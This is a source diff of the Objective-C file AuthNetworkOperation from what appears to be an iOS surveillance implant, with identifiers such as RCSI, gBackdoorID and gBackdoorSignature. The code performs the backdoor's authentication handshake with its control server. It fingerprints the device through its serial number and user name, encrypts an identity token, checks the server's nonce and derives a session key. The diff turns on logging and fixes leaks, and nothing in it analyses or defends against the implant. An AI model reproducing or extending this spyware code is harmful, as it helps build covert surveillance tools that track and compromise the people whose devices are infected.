@@ -15,13 +15,14 @@
 #import "RCSICommon.h"
 #import "RCSITaskManager.h"
 
+#define JSON_CONF
 ////#import "RCSMLogger.h"
 ////#import "RCSMDebug.h"
 
 //#define DEBUG_AUTH_NOP
-//#define infoLog NSLog
-//#define errorLog NSLog
-//#define warnLog NSLog
+#define infoLog NSLog
+#define errorLog NSLog
+#define warnLog NSLog
 
 @implementation AuthNetworkOperation
 
@@ -29,17 +30,10 @@
 {
   if ((self = [super init]))
     {
-      // Temp Code
-      unsigned char signature[CC_MD5_DIGEST_LENGTH];
-      CC_MD5(gBackdoorSignature, strlen(gBackdoorSignature), signature);
-      
-      mBackdoorSignature = [[NSData alloc] initWithBytes: &signature
+      mBackdoorSignature = [[NSData alloc] initWithBytes: gBackdoorSignature
                                                   length: CC_MD5_DIGEST_LENGTH];
       mTransport = aTransport;
-      
-#ifdef DEBUG_AUTH_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
+
       return self;
     }
   
@@ -49,17 +43,12 @@
 - (void)dealloc
 {
   [mBackdoorSignature release];
-  //[mTransport release];
   
   [super dealloc];
 }
 
 - (BOOL)perform
-{
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"");
-#endif
-  
+{ 
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   u_int randomNumber, i;
@@ -70,18 +59,15 @@
   NSMutableData *kd     = [[NSMutableData alloc] init];
   NSMutableData *nOnce  = [[NSMutableData alloc] init];
   
-  //
   // Generate kd (16 bytes)
-  //
   for (i = 0; i < 16; i += 4)
     {
       randomNumber = random();
       [kd appendBytes: (const void *)&randomNumber
                length: sizeof(randomNumber)];
     }
-  //
+
   // Generate nonce (16 bytes)
-  //
   for (i = 0; i < 16; i += 4)
     {
       randomNumber = random();
@@ -89,59 +75,54 @@
                   length: sizeof(randomNumber)];
     }
   
-#ifdef DEV_MODE
-  unsigned char confkey[CC_MD5_DIGEST_LENGTH];
-  unsigned char instance[CC_SHA1_DIGEST_LENGTH];
-  CC_MD5(gConfAesKey, strlen(gConfAesKey), confkey);
-  CC_SHA1(gInstanceId, strlen(gInstanceId), instance);
-  
-  NSData *confKey = [NSData dataWithBytes: &confkey
-                                   length: CC_MD5_DIGEST_LENGTH];
-  NSData *instanceID = [NSData dataWithBytes: &instance
-                                      length: CC_SHA1_DIGEST_LENGTH];
-#else
   NSData *confKey = [NSData dataWithBytes: &gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
   
-  NSString *serialNumber;
-  serialNumber = getSystemSerialNumber();
+  NSString *serialNumber = getSystemSerialNumber();
   
   NSMutableString *_instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
-  
-  //CFRelease(serialNumber);
-  
+   
   NSString *userName = NSUserName();
   [_instanceID appendString: userName];
   
   NSData *instanceID = [_instanceID sha1Hash];
   [_instanceID release];
-#endif
   
   NSMutableData *backdoorID = [[NSMutableData alloc] init];
+  
   [backdoorID appendBytes: &gBackdoorID
                    length: strlen(gBackdoorID)];
+                   
   [backdoorID appendBytes: &nullTerminator
                    length: sizeof(char)];
   [backdoorID appendBytes: &nullTerminator
                    length: sizeof(char)];
+
+  // FIXED-
+  NSMutableData *type;
   
-  NSMutableData *type = [[NSMutableData alloc] initWithData:
-                         [@"IPHONE" dataUsingEncoding: NSASCIIStringEncoding]];
-  for (i = 0; i < 10; i++)
+  if (gIsDemoMode)
+    type = [[NSMutableData alloc] initWithData:
+                                  [@"IOS-DEMO" dataUsingEncoding: NSASCIIStringEncoding]];
+  else
+    type = [[NSMutableData alloc] initWithData:
+                                  [@"IOS" dataUsingEncoding: NSASCIIStringEncoding]];
+  
+  int typeLen = 16 - [type length];
+  
+  for (i = 0; i < typeLen; i++)
     {
       [type appendBytes: &nullTerminator
                  length: sizeof(char)];
     }
   
-  //
   // Generate id token sha1(backdoor_id + instance + subtype + confkey)
-  //
   NSMutableData *idToken = [[NSMutableData alloc] init];
   [idToken appendData: backdoorID];
   [idToken appendData: instanceID];
   [idToken appendData: type];
   [idToken appendData: confKey];
-  
+
 #ifdef DEBUG_AUTH_NOP
   infoLog(@"kd    : %@", kd);
   infoLog(@"nOnce : %@", nOnce);
@@ -151,11 +132,8 @@
   infoLog(@"confkey     : %@", confKey);
   infoLog(@"idToken: %@", idToken);
 #endif
+
   NSData *shaIDToken = [idToken sha1Hash];
-  
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"shaIDToken: %@", shaIDToken);
-#endif
   
   // Prepare the encrypted message
   NSMutableData *message = [[NSMutableData alloc] init];
@@ -165,21 +143,11 @@
   [message appendData: instanceID];
   [message appendData: type];
   [message appendData: shaIDToken];
-  
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"message: %@", message);
-#endif
-  
+ 
   NSMutableData *encMessage = [[NSMutableData alloc] initWithData: message];
   [encMessage encryptWithKey: mBackdoorSignature];
-  
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"message enc: %@", encMessage);
-#endif
-  
-  //
+   
   // Send encrypted message
-  //
   NSURLResponse *urlResponse  = nil;
   NSData *replyData           = nil;
   
@@ -187,12 +155,7 @@
                  returningResponse: urlResponse];
   
   if ([replyData length] != 64)
-    {
-#ifdef DEBUG_AUTH_NOP
-      errorLog(@"Wrong auth response length");
-      errorLog(@"replyData: %@", replyData);
-#endif
-      
+    {    
       [kd release];
       [nOnce release];
       [backdoorID release];
@@ -216,11 +179,7 @@
   
   NSString *ksString = [[NSString alloc] initWithData: ks
                                              encoding: NSUTF8StringEncoding];
-  
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"ks: %@", ks);
-#endif
-  
+
   // calculate the session key -> K = sha1(Cb || Ks || Kd)
   // we use a schema like PBKDF1
   // remember it for the entire session
@@ -230,11 +189,7 @@
   [sessionKey appendData: kd];
   
   gSessionKey = [[NSMutableData alloc] initWithData: [sessionKey sha1Hash]];
-  
-#ifdef DEBUG_AUTH_NOP
-  infoLog(@"shaSessionKey: %@", gSessionKey);
-#endif
-  
+
   // second part of the server response contains the NOnce and the response
   // extract the NOnce and check if it is ok
   // this MUST be the same NOnce sent to the server, but since it is crypted
@@ -247,11 +202,7 @@
                              NSMakeRange(32, [replyData length] - 32)]];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_AUTH_NOP
-      errorLog(@"exception on secondPartResponse makerange (%@)", [e reason]);
-#endif
-      
+    {   
       return NO;
     }
   
@@ -260,11 +211,7 @@
   NSData *rNonce = [[NSData alloc] initWithBytes: [secondPartResponse bytes]
                                           length: 16];
   if ([nOnce isEqualToData: rNonce] == NO)
-    {
-#ifdef DEBUG_AUTH_NOP
-      errorLog(@"Invalid NOnce");
-#endif
-      
+    {    
       return NO;
     }
   
@@ -289,6 +236,10 @@
   
   [kd release];
   [nOnce release];
+  // FIXED-
+  [backdoorID release];
+  [type release];
+  //
   [idToken release];
   [message release];
   [encMessage release];
